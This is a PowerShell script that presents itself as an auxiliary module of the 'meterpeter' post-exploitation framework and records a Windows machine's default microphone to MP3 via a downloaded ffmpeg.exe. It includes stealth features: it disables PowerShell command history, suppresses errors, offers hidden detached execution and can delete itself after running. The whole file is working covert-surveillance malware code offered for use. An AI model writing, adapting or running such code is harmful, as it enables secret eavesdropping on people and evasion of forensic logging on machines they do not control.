<#
.SYNOPSIS
   records mic audio until -rectime <sec> its reached

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: ffmpeg.exe {auto-download}
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.3

.DESCRIPTION
   Auxiliary Module of meterpeter v2.10.14.1 that records native
   microphone audio until -rectime <seconds> parameter its reached

.NOTES
   The first time this cmdlet runs it checks if ffmpeg.exe its
   present in -workingdir "$Env:TMP". If not it downloads it from
   GitHub repo (download takes aprox 2 minutes) before execute it.

.Parameter workingDir
   cmdlet working directory (default: $Env:TMP)

.Parameter Mp3Name
   The audio file name (default: AudioClip.mp3)

.Parameter RecTime
   Record audio for xx seconds (default: 10)

.Parameter Random
   Switch that random generates Mp3 filename

.Parameter AutoDelete
   Switch that auto-deletes this cmdlet in the end

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -workingDir "$pwd"
   Use current directory as working directory

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -rectime "25"
   Record audio for 25 seconds and stop

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -random
   Random generate MP3 file name (create multiple files)

.EXAMPLE
   PS C:\> Start-Process -windowstyle hidden powershell -argumentlist "-file rec_audio.ps1 -rectime 60 -autodelete"
   Execute this cmdlet for 60 seconds in an hidden console detach from parent process (orphan process)

.INPUTS
   None. You cannot pipe objects into rec_audio.ps1

.OUTPUTS
   [aist#0:0/pcm_s16le @ 0000026dcda68a00] Guessed Channel Layout: stereo
   Input #0, dshow, from 'audio=Microfone (Conexant SmartAudio HD)':
     Duration: N/A, start: 39636.041000, bitrate: 1411 kb/s
     Stream #0:0: Audio: pcm_s16le, 44100 Hz, stereo, s16, 1411 kb/s
   Stream mapping:
     Stream #0:0 -> #0:0 (pcm_s16le (native) -> mp3 (libmp3lame))
   Press [q] to stop, [?] for help
   Output #0, mp3, to 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3':
     Metadata:
       TSSE            : Lavf60.22.101
     Stream #0:0: Audio: mp3, 44100 Hz, mono, s16p, 128 kb/s
         Metadata:
           encoder         : Lavc60.40.100 libmp3lame
   [out#0/mp3 @ 0000026dcdb066c0] video:0KiB audio:78KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.575715%
   size=      79KiB time=00:00:05.00 bitrate= 129.1kbits/s speed=0.909x

.LINK
   https://github.com/r00t-3xp10it/redpil
   https://learn.microsoft.com/en-us/windows/package-manager/winget
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Mp3Name="AudioClip.mp3",
   [string]$WorkingDir="$Env:TMP",
   [switch]$AutoDelete,
   [int]$RecTime='10',
   [switch]$Random
)


$cmdletver = "v1.0.3"
$IPath = (Get-Location).Path.ToString()
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "rec_audio $cmdletver"

## Set default record time (seconds)
If([string]::IsNullOrEmpty($RecTime))
{
   $RecTime = 10
}

## Download ffmpeg.exe from GitHub?
If(-not(Test-Path "$WorkingDir\ffmpeg.exe"))
{
   $ffmpegUrl = "https://objects.githubusercontent.com/github-production-release-asset-2e65be/292087234/1580f897-7d95-4290-9a45-f4c2ce28e2eb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240229%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240229T235134Z&X-Amz-Expires=300&X-Amz-Signature=d03bb56df38e453a955ca3c7fb35321d7bd615cecc94c1f6afd523b01c3b749b&X-Amz-SignedHeaders=host&actor_id=23490060&key_id=0&repo_id=292087234&response-content-disposition=attachment%3B%20filename%3Dffmpeg-master-latest-win64-gpl-shared.zip&response-content-type=application%2Foctet-stream";
   iwr -Uri "$ffmpegUrl" -OutFile "$WorkingDir\ffmpeg.zip"|Unblock-File

   Expand-Archive "$WorkingDir\ffmpeg.zip" -DestinationPath "$WorkingDir" -Force
   Move-Item -Path "$WorkingDir\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -Destination "$WorkingDir\ffmpeg.exe" -Force
   Remove-Item -Path "$WorkingDir\ffmpeg-master-latest-win64-gpl" -Force -Recurse
}

## Make sure we have downloaded ffmpeg.exe
If(-not(Test-Path "$WorkingDir\ffmpeg.exe"))
{
   write-host "x [fail] to download ffmpeg.exe to '$WorkingDir'" -ForegroundColor Red
   return
}


## Add Assemblies
Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system;
   
function GetFriendlyName($id)
{
   $MMDEVAPI = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";
   return (Get-ItemProperty $MMDEVAPI).FriendlyName
}

cd "$WorkingDir"      
$Audioid = [audio]::GetDefault(1);
$MicName = "$(GetFriendlyName $Audioid)";

If($Random.IsPresent)
{
   $RandomN = [IO.Path]::GetFileNameWithoutExtension([System.IO.Path]::GetRandomFileName())
   $MP3Path = "$WorkingDir" + "\" + "$RandomN" + ".mp3" -join ''
}
Else
{
   $MP3Path = "$WorkingDir" + "\" + "$mp3Name" -join ''
}

.\ffmpeg.exe -y -hide_banner -f dshow -i audio="$MicName" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
cd "$IPath"


## CleanUp
If($AutoDelete.IsPresent)
{
   ## Auto Delete this cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}
exit